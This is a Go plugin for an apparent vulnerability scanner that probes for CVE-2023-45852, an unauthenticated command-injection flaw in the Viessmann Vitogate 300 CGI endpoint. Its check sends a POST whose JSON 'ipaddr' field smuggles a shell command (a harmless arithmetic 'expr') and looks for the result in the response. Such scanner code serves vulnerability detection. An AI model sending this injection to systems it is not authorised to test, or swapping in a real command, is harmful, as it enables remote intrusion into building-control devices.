package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

func init() {
	Register("viessmann_vitogate_rce", &viessmann_vitogate_rce{})
}

type viessmann_vitogate_rce struct{}

func (p *viessmann_vitogate_rce) Info() PluginInfo {
	return PluginInfo{
		Name:     "Viessmann Vitogate RCE漏洞",
		VulnInfo: "Vitogate 300 2.1.3.0版本的/cgi-bin/vitogate.cgi存在一个未经身份验证的攻击者可利用的漏洞，通过put方法中的ipaddr params JSON数据中的shell元字符实现绕过身份验证并执行任意命令。",
		VulnID:   "CVE-2023-45852",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "version ≤ 2.1.3.0",
		CWE:      "CWE-77	命令注入",
	}
}

func (p *viessmann_vitogate_rce) Check(netloc string) bool {
	rand1 := utils.GenRandomInt(5)
	rand2 := utils.GenRandomInt(5)
	payload := `{"method":"put","form":"form-4-8","session":"","params":{"ipaddr":"1;`
	payload += fmt.Sprintf("expr %d + %d", rand1, rand2)
	payload += `"}}`

	req, err := http.NewRequest("POST", netloc+"/cgi-bin/vitogate.cgi", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, strconv.Itoa(rand1+rand2)) {
		return true
	}
	return false
}
